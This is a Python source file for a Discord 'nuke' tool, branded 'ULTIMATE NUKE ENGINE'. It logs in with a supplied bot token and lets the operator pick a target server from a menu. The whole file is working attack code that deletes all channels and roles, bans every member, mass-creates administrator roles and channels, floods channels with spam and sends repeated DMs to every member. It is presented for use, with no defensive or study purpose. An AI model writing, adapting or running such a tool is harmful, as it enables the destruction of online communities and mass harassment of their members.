#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random
import asyncio
import discord
from discord.ext import commands
from colorama import init, Fore, Style

init(autoreset=True)

RED = Fore.RED + Style.BRIGHT
RESET = Style.RESET_ALL

LOGO = f"""
{RED}
██████╗  ██████╗ ███████╗███████╗
╚════██╗██╔═████╗██╔════╝██╔════╝
 █████╔╝██║██╔██║███████╗███████╗
 ╚═══██╗████╔╝██║╚════██║╚════██║
██████╔╝╚██████╔╝███████║███████║
╚═════╝  ╚═════╝ ╚══════╝╚══════╝{RESET}
"""

BANNER = f"""
{RED}╔══════════════════════════════════════╗
{RED}║        ULTIMATE NUKE ENGINE        ║
{RED}║        PROGRAMMED BY 3ZF           ║
{RED}╚══════════════════════════════════════╝{RESET}
"""

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def show_banner(user=None):
    clear_screen()
    print(LOGO)
    print(BANNER)
    if user:
        print(f"{RED}[+] LOGGED IN AS: {user}{RESET}")

show_banner()
TOKEN = input(f"{RED}> ENTER TOKEN: {RESET}").strip()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

selected_guild = None
running = True

@bot.event
async def on_ready():
    global selected_guild
    show_banner(bot.user.name)
    servers = sorted(list(bot.guilds), key=lambda x: x.member_count, reverse=True)
    print(f"\n{RED}SERVERS ({len(servers)}):{RESET}")
    for i, s in enumerate(servers):
        print(f"  {RED}{i+1}. {s.name[:20]:<20} (MEMBERS: {s.member_count}){RESET}")
    while True:
        try:
            idx = int(input(f"\n{RED}> CHOOSE SERVER NUMBER: {RESET}")) - 1
            if 0 <= idx < len(servers):
                selected_guild = servers[idx]
                break
        except ValueError:
            pass
        print(f"{RED}[-] INVALID NUMBER{RESET}")
    print(f"\n{RED}[+] TARGET: {selected_guild.name}{RESET}")
    await main_menu()

async def main_menu():
    global running
    while running:
        print(f"\n{RED}┌─────────────────────────────────────────────────────────────┐")
        print(f"{RED}│ [1] DELETE CHANNELS   |   [2] DELETE ROLES     │")
        print(f"{RED}│ [3] BAN MEMBERS       |   [4] CREATE CHANNELS  │")
        print(f"{RED}│ [5] CREATE ROLES      |   [6] SPAM MESSAGES    │")
        print(f"{RED}│ [7] CHANGE SERVER NAME|   [8] DM ALL MEMBERS   │")
        print(f"{RED}│ [9] EXIT                                        │")
        print(f"{RED}└─────────────────────────────────────────────────────────────┘")
        print(f"\n{RED}            PROGRAMMED BY 3ZF{RESET}")
        choice = input(f"\n{RED}> CHOOSE OPTION: {RESET}").strip()
        if choice == "1": await delete_channels()
        elif choice == "2": await delete_roles()
        elif choice == "3": await ban_members()
        elif choice == "4": await create_channels()
        elif choice == "5": await create_roles()
        elif choice == "6": await spam_messages()
        elif choice == "7": await change_server_name()
        elif choice == "8": await dm_all_members()
        elif choice == "9":
            running = False
            print(f"\n{RED}[+] EXITING...{RESET}")
            await bot.close()
            sys.exit(0)
        else:
            print(f"{RED}[-] INVALID OPTION{RESET}")
            await asyncio.sleep(1)

async def delete_channels():
    print(f"\n{RED}[+] DELETING ALL CHANNELS...{RESET}")
    try:
        channels = list(selected_guild.channels)
        if not channels:
            print(f"{RED}[-] NO CHANNELS TO DELETE{RESET}")
            await asyncio.sleep(1)
            return
        chunk_size = 100
        for i in range(0, len(channels), chunk_size):
            chunk = channels[i:i+chunk_size]
            await asyncio.gather(*[ch.delete() for ch in chunk], return_exceptions=True)
        print(f"{RED}[+] CHANNELS DELETED!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
    await asyncio.sleep(1)

async def delete_roles():
    print(f"\n{RED}[+] DELETING ALL ROLES...{RESET}")
    try:
        roles = [r for r in selected_guild.roles if r.name != "@everyone"]
        if not roles:
            print(f"{RED}[-] NO ROLES TO DELETE{RESET}")
            await asyncio.sleep(1)
            return
        chunk_size = 100
        for i in range(0, len(roles), chunk_size):
            chunk = roles[i:i+chunk_size]
            await asyncio.gather(*[r.delete() for r in chunk], return_exceptions=True)
        print(f"{RED}[+] ROLES DELETED!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
    await asyncio.sleep(1)

async def ban_members():
    confirm = input(f"{RED}> BAN ALL MEMBERS? (YES/NO): {RESET}").lower()
    if confirm != "yes":
        print(f"{RED}[-] CANCELLED{RESET}")
        await asyncio.sleep(1)
        return
    print(f"\n{RED}[+] BANNING MEMBERS...{RESET}")
    try:
        members = [m for m in selected_guild.members if m.id != bot.user.id and not m.bot]
        if not members:
            print(f"{RED}[-] NO MEMBERS TO BAN{RESET}")
            await asyncio.sleep(1)
            return
        chunk_size = 50
        for i in range(0, len(members), chunk_size):
            chunk = members[i:i+chunk_size]
            await asyncio.gather(*[m.ban(reason="NUKE") for m in chunk], return_exceptions=True)
        print(f"{RED}[+] {len(members)} MEMBERS BANNED!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
    await asyncio.sleep(1)

async def create_channels():
    try:
        count = int(input(f"{RED}> HOW MANY CHANNELS?: {RESET}"))
        if count <= 0:
            print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
            await asyncio.sleep(1)
            return
    except ValueError:
        print(f"{RED}[-] ENTER A NUMBER{RESET}")
        await asyncio.sleep(1)
        return
    
    print(f"\n{RED}[+] ENTER 3 CHANNEL NAMES (PRESS ENTER AFTER EACH):{RESET}")
    names = []
    for i in range(3):
        name = input(f"{RED}> NAME {i+1}: {RESET}").strip()
        if name:
            names.append(name)
        else:
            names.append(f"CHANNEL-{i+1}")
    
    print(f"\n{RED}[+] CREATING {count} CHANNELS...{RESET}")
    try:
        tasks = []
        for i in range(count):
            name = names[i % 3]
            tasks.append(selected_guild.create_text_channel(name))
        
        chunk_size = 50
        for i in range(0, len(tasks), chunk_size):
            chunk = tasks[i:i+chunk_size]
            await asyncio.gather(*chunk, return_exceptions=True)
        print(f"{RED}[+] {count} CHANNELS CREATED!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
    await asyncio.sleep(1)

async def create_roles():
    try:
        count = int(input(f"{RED}> HOW MANY ROLES?: {RESET}"))
        if count <= 0:
            print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
            await asyncio.sleep(1)
            return
    except ValueError:
        print(f"{RED}[-] ENTER A NUMBER{RESET}")
        await asyncio.sleep(1)
        return
    
    print(f"\n{RED}[+] ENTER 3 ROLE NAMES (PRESS ENTER AFTER EACH):{RESET}")
    names = []
    for i in range(3):
        name = input(f"{RED}> NAME {i+1}: {RESET}").strip()
        if name:
            names.append(name)
        else:
            names.append(f"ROLE-{i+1}")
    
    print(f"\n{RED}[+] CREATING {count} ADMIN ROLES...{RESET}")
    try:
        tasks = []
        for i in range(count):
            name = names[i % 3]
            tasks.append(selected_guild.create_role(
                name=name,
                color=discord.Color.from_rgb(139, 0, 0),
                permissions=discord.Permissions(administrator=True)
            ))
        
        chunk_size = 50
        for i in range(0, len(tasks), chunk_size):
            chunk = tasks[i:i+chunk_size]
            await asyncio.gather(*chunk, return_exceptions=True)
        print(f"{RED}[+] {count} ADMIN ROLES CREATED!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
    await asyncio.sleep(1)

async def spam_messages():
    try:
        count = int(input(f"{RED}> MESSAGES PER CHANNEL?: {RESET}"))
        if count <= 0:
            print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
            await asyncio.sleep(1)
            return
    except ValueError:
        print(f"{RED}[-] ENTER A NUMBER{RESET}")
        await asyncio.sleep(1)
        return
    
    msg = input(f"{RED}> MESSAGE CONTENT: {RESET}")
    if not msg:
        print(f"{RED}[-] MESSAGE CANNOT BE EMPTY{RESET}")
        await asyncio.sleep(1)
        return
    
    text_channels = list(selected_guild.text_channels)
    if not text_channels:
        print(f"{RED}[-] NO TEXT CHANNELS FOUND{RESET}")
        await asyncio.sleep(1)
        return
    
    print(f"\n{RED}[+] SPAMMING {count} MESSAGES TO {len(text_channels)} CHANNELS...{RESET}")
    try:
        tasks = []
        for ch in text_channels:
            for _ in range(count):
                tasks.append(ch.send(msg))
        
        chunk_size = 200
        for i in range(0, len(tasks), chunk_size):
            chunk = tasks[i:i+chunk_size]
            await asyncio.gather(*chunk, return_exceptions=True)
        print(f"{RED}[+] SPAM COMPLETED!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
    await asyncio.sleep(1)

async def change_server_name():
    name = input(f"{RED}> NEW SERVER NAME: {RESET}")
    if not name:
        print(f"{RED}[-] NAME CANNOT BE EMPTY{RESET}")
        await asyncio.sleep(1)
        return
    try:
        await selected_guild.edit(name=name)
        print(f"{RED}[+] SERVER NAME CHANGED TO: {name}{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
    await asyncio.sleep(1)

async def dm_all_members():
    try:
        count = int(input(f"{RED}> HOW MANY MESSAGES PER MEMBER?: {RESET}"))
        if count <= 0:
            print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
            await asyncio.sleep(1)
            return
    except ValueError:
        print(f"{RED}[-] ENTER A NUMBER{RESET}")
        await asyncio.sleep(1)
        return
    
    msg = input(f"{RED}> MESSAGE CONTENT: {RESET}")
    if not msg:
        print(f"{RED}[-] MESSAGE CANNOT BE EMPTY{RESET}")
        await asyncio.sleep(1)
        return
    
    members = [m for m in selected_guild.members if m.id != bot.user.id and not m.bot]
    if not members:
        print(f"{RED}[-] NO MEMBERS TO DM{RESET}")
        await asyncio.sleep(1)
        return
    
    print(f"\n{RED}[+] SENDING {count} DMS TO {len(members)} MEMBERS...{RESET}")
    
    try:
        tasks = []
        for member in members:
            for _ in range(count):
                tasks.append(member.send(msg))
        
        chunk_size = 200
        for i in range(0, len(tasks), chunk_size):
            chunk = tasks[i:i+chunk_size]
            await asyncio.gather(*chunk, return_exceptions=True)
        print(f"{RED}[+] DMS SENT SUCCESSFULLY!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
    await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        bot.run(TOKEN, reconnect=True)
    except discord.LoginFailure:
        print(f"{RED}[-] INVALID TOKEN{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
        sys.exit(1)
